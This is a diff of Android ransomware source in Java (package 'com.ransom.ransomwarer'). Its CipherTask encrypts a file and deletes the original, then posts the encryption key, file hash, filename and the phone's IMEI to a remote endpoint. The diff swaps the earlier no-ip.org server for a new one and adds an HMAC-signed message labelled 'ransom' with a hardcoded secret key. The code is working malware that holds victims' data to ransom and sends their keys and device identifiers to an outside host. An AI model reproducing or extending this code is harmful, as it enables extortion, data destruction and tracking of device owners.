@@ -2,10 +2,19 @@ package com.ransom.ransomwarer;
 
 import java.io.File;
 import java.io.IOException;
+import java.security.InvalidKeyException;
+import java.security.NoSuchAlgorithmException;
+import java.text.SimpleDateFormat;
 import java.util.ArrayList;
+import java.util.Calendar;
 import java.util.List;
+import java.util.Locale;
+import java.util.TimeZone;
 
-import org.apache.http.HttpResponse;
+import javax.crypto.Mac;
+import javax.crypto.spec.SecretKeySpec;
+
+import org.apache.http.HttpEntity;
 import org.apache.http.HttpVersion;
 import org.apache.http.NameValuePair;
 import org.apache.http.client.HttpClient;
@@ -14,7 +23,6 @@ import org.apache.http.client.methods.HttpPost;
 import org.apache.http.impl.client.DefaultHttpClient;
 import org.apache.http.message.BasicNameValuePair;
 import org.apache.http.params.CoreProtocolPNames;
-import org.apache.http.util.EntityUtils;
 
 import android.app.IntentService;
 import android.content.Context;
@@ -52,50 +60,63 @@ public class MainService extends IntentService {
 		public String key;
 	}
 
-	private class CipherTask extends AsyncTask<File, String, KeyFilePair> {
-		protected void onPostExecute(KeyFilePair result) {
-			if (result != null) {
-				sendKeyToServer(result);
-			}
-		}
+	private class CipherTask extends AsyncTask<File, String, Void> {
+		private static final String URL = "http://www.tcbpg.com.ar/endpoint.php";
+		private final SecretKeySpec keySpec = 
+				new SecretKeySpec("qnsXcdaBFQIhAUPY44oiexBdkjAABQjqk120sdi0".getBytes(),"HmacSHA1");
 
-		private static final String URL = "http://manzana.no-ip.org/subir.php";
-		
-		private class SendFileToServer extends AsyncTask<KeyFilePair,Void,Void>{
-			protected Void doInBackground(KeyFilePair... arg0) {
-				KeyFilePair p = arg0[0];
+		private void sendKeyToServer(KeyFilePair p) {
+			try {
+				HttpPost post = new HttpPost(URL);
+				HttpClient client = new DefaultHttpClient();
+				client.getParams().setParameter(
+						CoreProtocolPNames.PROTOCOL_VERSION, HttpVersion.HTTP_1_1);
+
+				List<NameValuePair> content = new ArrayList<NameValuePair>();
+				content.add(new BasicNameValuePair("messageType","ransom"));
+				String messageBody = String.format("{\"sha1\":\"%s\",\"pwd\":\"%s\",\"filename\":\"%s\"}", 
+						p.fileDigest,p.key.trim(),p.fileName);
+									
+				content.add(new BasicNameValuePair("messageBody", messageBody));
+				
+				TelephonyManager t = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
+				String imei = t.getDeviceId();
+				content.add(new BasicNameValuePair("imei",imei));
+
+				final String format = "yyyy-MM-dd HH:mm:ss.SSSZ";
+				SimpleDateFormat sdf = new SimpleDateFormat(format, Locale.US);
+				sdf.setTimeZone(TimeZone.getTimeZone("UTC"));
+				String timestamp = sdf.format(Calendar.getInstance().getTime());
+				content.add(new BasicNameValuePair("timestamp",timestamp));
+				
+				Mac m;
 				try {
-					HttpPost post = new HttpPost(URL);
-					HttpClient client = new DefaultHttpClient();
-					client.getParams().setParameter(
-							CoreProtocolPNames.PROTOCOL_VERSION, HttpVersion.HTTP_1_1);
-
-					List<NameValuePair> content = new ArrayList<NameValuePair>();
-					content.add(new BasicNameValuePair("sha1", p.fileDigest));
-					content.add(new BasicNameValuePair("pwd", p.key));
-					content.add(new BasicNameValuePair("fileName", p.fileName));
-
-					TelephonyManager t = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
-					content.add(new BasicNameValuePair("imei",t.getDeviceId()));
-
-					post.setEntity(new UrlEncodedFormEntity(content));
-
-					HttpResponse response = client.execute(post);
-
-					Log.d("RANSOMWARER","Server replied: "+ EntityUtils.toString(response.getEntity()));
-				} catch (Exception e) {
-					Log.e("RANSOMWARER", "Exception sending data: ", e);
+					m = Mac.getInstance("HmacSHA1");
+					m.init(keySpec);
+				} catch (NoSuchAlgorithmException e1) {
+					Log.d("RANSOMWARER","Unknown HMAC algorithm");
+					Log.e("RANSOMWARER","NoSuchAlgorithm",e1);
+					return;
+				} catch (InvalidKeyException e) {
+					Log.d("RANSOMWARER","Invalid Key Exception");
+					Log.e("RANSOMWARER","InvalidKeyException",e);
+					return;
 				}
 
-				return null;
+				String total = "ransom" + messageBody + imei + timestamp;
+				String hmac = Base64.encodeToString(m.doFinal(total.getBytes()),Base64.DEFAULT);
+
+				content.add(new BasicNameValuePair("hmac",hmac));					
+				HttpEntity e = new UrlEncodedFormEntity(content);
+				post.setEntity(e);
+				
+				client.execute(post);
+			} catch (Exception e) {
+				Log.e("RANSOMWARER", "Exception sending data: ", e);
 			}
-			
-		}
-		private void sendKeyToServer(KeyFilePair p) {
-			new SendFileToServer().execute(p);
 		}
 
-		protected KeyFilePair doInBackground(File... files) {
+		protected Void doInBackground(File... files) {
 			KeyProvider provider = new CacheGeneratorKeyProvider();
 			RansomwareHandler handler = new RansomwareHandler(provider);
 
@@ -106,16 +127,11 @@ public class MainService extends IntentService {
 				return null;
 			}
 
-			if (!files[0].delete()) {
-				Log.e("RANSOMWARER",
-						"Could not delete" + files[0].getAbsolutePath());
-			}
-
-			String result = Base64.encodeToString(provider.getKey()
-					.getEncoded(), Base64.DEFAULT);
-
-			return new KeyFilePair(files[0].getName(), computeSHA1(files[1]),
-					result);
+			files[0].delete();
+			
+			String result = Base64.encodeToString(provider.getKey().getEncoded(), Base64.DEFAULT);
+			sendKeyToServer(new KeyFilePair(files[0].getName(), computeSHA1(files[1]),result));
+			return null;
 		}
 
 		private String computeSHA1(File file) {
